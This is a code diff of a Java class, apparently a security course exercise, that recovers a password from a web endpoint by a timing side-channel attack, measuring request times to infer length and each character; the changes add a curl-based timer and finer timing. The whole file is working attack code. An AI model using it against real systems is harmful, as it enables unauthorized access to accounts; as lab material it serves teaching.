@@ -16,13 +16,13 @@ public class ex01_M2 {
 	 * @param args
 	 */
 	public static void main(String[] args) throws Exception {
-		int difficulty = 1;
-		int attempts = 3;
+		int difficulty = 10;
+		int attempts = 10;
 		//		int len = findPasswordLength(3, difficulty);
 		//		System.out.println("password length: "+len);
 
 		String passwd = findPassword(attempts, difficulty); 
-		System.out.println(passwd);
+		System.out.println("@@@@@@@@@@"+passwd);
 		//...
 		//System.out.println(username + " " + password + " " + difficulty);
 		//...
@@ -34,27 +34,31 @@ public class ex01_M2 {
 		double maxReqTime = 0;
 		int maxLen = 32;
 		double[] reqTimes = new double[maxLen];
-		double tmpReqTime = 0;
+		double curReqTime = 0;
 		String passwd;
 		
 		for (int i = 0; i < maxLen; i++) {
 			reqTimes[i] = Double.MAX_VALUE;
+//			reqTimes[i] = 0;
 		}
 		
 		for (int i = 0; i < attempts; i++) {
 			 passwd = "";
 			for (int j = 0; j < maxLen; j++) {
 				passwd += "a";
-				tmpReqTime = getReqTime(URL+passwd+DIFFICULTY+difficulty);
-				if (tmpReqTime < reqTimes[j]) {
-					reqTimes[j] = tmpReqTime;
-				}
+//				curReqTime = getReqTime(URL+passwd+DIFFICULTY+difficulty);
+				curReqTime = getReqTimeCurl(URL+passwd+DIFFICULTY+difficulty);
+				reqTimes[j] = Math.min(reqTimes[j], curReqTime);
+//				reqTimes[j] += curReqTime;
 				System.out.println("attempt: "+i+" length: "+(j+1)+" reqTime: "+reqTimes[j]);
 			}
+			
 		}
 		
 		for (int i = 0; i < maxLen; i++) {
-			System.out.println("length: "+(i+1)+" reqTime: "+reqTimes[i]);
+//			System.out.println(reqTimes[i]);
+//			reqTimes[i] = reqTimes[i]/attempts;
+			System.out.println("length: "+(i+1)+" mean reqTime: "+reqTimes[i]);
 			if (maxReqTime < reqTimes[i]) {
 				maxReqTime = reqTimes[i];
 				len = i+1;
@@ -71,42 +75,52 @@ public class ex01_M2 {
 		int lettersLen = LETTERS.length;
 		double maxReqTime = 0;
 		double[] reqTimes = new double[lettersLen];
-		double tmpReqTime = 0;
-		char currChar = '0';
+		double curReqTime = 0;
+		char curChar = '0';
 		String passwd = "";
-		String passSuff = new String(new char[len-1]).replace('\0', '0');
+//		String passwd = "yzdgalnekz";
+//		String passwd = "yzdgalnekzIuSqn";
+		String passSuff = new String(new char[len-(passwd.length()+1)]).replace('\0', '0');
 		
-		for (int i = 0; i < lettersLen; i++) {
-			reqTimes[i] = Double.MAX_VALUE;
-		}
 		
-		for (int i = 0; i < len-1; i++) {
+		
+		for (int i = passwd.length(); i < len-1; i++) {
+			
 			maxReqTime = 0;
+			for (int j = 0; j < lettersLen; j++) {
+				reqTimes[j] = Double.MAX_VALUE;
+//				reqTimes[i] = 0;
+			}
+			
 			for (int j = 0; j < attempts; j++) {
 				for (int k = 0; k < lettersLen; k++) {
-					tmpReqTime = getReqTime(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
-					if (tmpReqTime < reqTimes[k]) {
-						reqTimes[k] = tmpReqTime;
-					}
-					System.out.println("attempt: "+j+" passwd: "+passwd+LETTERS[k]+passSuff+" reqTime: "+tmpReqTime);
+//					curReqTime = getReqTime(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
+					curReqTime = getReqTimeCurl(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
+					reqTimes[k] = Math.min(reqTimes[k], curReqTime);
+//					reqTimes[k] = reqTimes[k] += curReqTime;
+					System.out.println("attempt: "+j+" passwd: "+passwd+LETTERS[k]+passSuff+" reqTime: "+curReqTime);
 				}
 				
 			}
 			
 			for (int j = 0; j < lettersLen; j++) {
+//				reqTimes[j] = reqTimes[j]/attempts;
 				System.out.println("passwd: "+passwd+LETTERS[j]+passSuff+" reqTime: "+reqTimes[j]);
 				if (maxReqTime < reqTimes[j]) {
 					maxReqTime = reqTimes[j];
-					currChar = LETTERS[j];
+					curChar = LETTERS[j];
 				}
 			}
 			
-			passwd += currChar;
+			passwd += curChar;
 			passSuff = passSuff.substring(1);
 		}
 		
+		boolean res;
 		for (int i = 0; i < lettersLen; i++) {
-			if(sendReq(URL+passwd+LETTERS[i]+DIFFICULTY+difficulty)) {
+			res = sendReq(URL+passwd+LETTERS[i]+DIFFICULTY+difficulty);
+			System.out.println("passwd: "+passwd+LETTERS[i]+" res: "+res);
+			if(res) {
 				passwd+=LETTERS[i];
 				return passwd;
 			}
@@ -170,13 +184,13 @@ public class ex01_M2 {
 	public static double getReqTime(String urlString) {
 		try {
 
-			long milliStart = System.currentTimeMillis();
+			long milliStart = System.nanoTime();
 
 			URL url = new URL(urlString);
 			URLConnection conn = url.openConnection();
 			conn.getInputStream();
 			
-			long milliEnd = System.currentTimeMillis();
+			long milliEnd = System.nanoTime();
 
 			return milliEnd - milliStart;
 
@@ -184,6 +198,26 @@ public class ex01_M2 {
 			e.printStackTrace();
 		}
 		return -1;
+	}
+	
+	public static double getReqTimeCurl(String url) {
+
+		String curl_cmd = CURL_CMD_START + url;
+		String res = "";
+		String time = "";
+		try {
+			Process process = Runtime.getRuntime().exec(curl_cmd);
+			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			
+			res = stdInput.readLine();
+			time = stdInput.readLine();
+			
+			process.destroy();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+
+		return Double.parseDouble(time);
 	}
 }
 
